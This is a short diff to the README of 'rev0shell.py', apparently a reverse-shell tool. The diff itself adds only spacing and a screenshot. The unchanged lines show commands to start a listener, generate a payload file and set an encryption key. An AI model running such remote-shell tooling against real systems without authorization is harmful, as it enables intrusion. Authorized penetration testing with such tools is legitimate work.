@@ -76,6 +76,7 @@ pip install rich pycryptodome
 <img width="1663" height="691" alt="Image" src="https://github.com/user-attachments/assets/0405d09c-bf4a-45ca-bd6b-b74b04ba7268" />
 Usage
 
+
 # Start listener
 python rev0shell.py --lhost 192.168.1.6 --lport 4444
 
@@ -93,6 +94,8 @@ python rev0shell.py --lhost 192.168.1.6 --lport 4444 --generate --output custom.
 
 # Custom encryption key
 python rev0shell.py --lhost 192.168.1.6 --lport 4444 --key MySecretKey123
+
+<img width="800" height="450" alt="Image" src="https://github.com/user-attachments/assets/57ced2a4-4a09-443c-a2ed-04b5356d2de9" />
 
 --------------------------------------------------
 
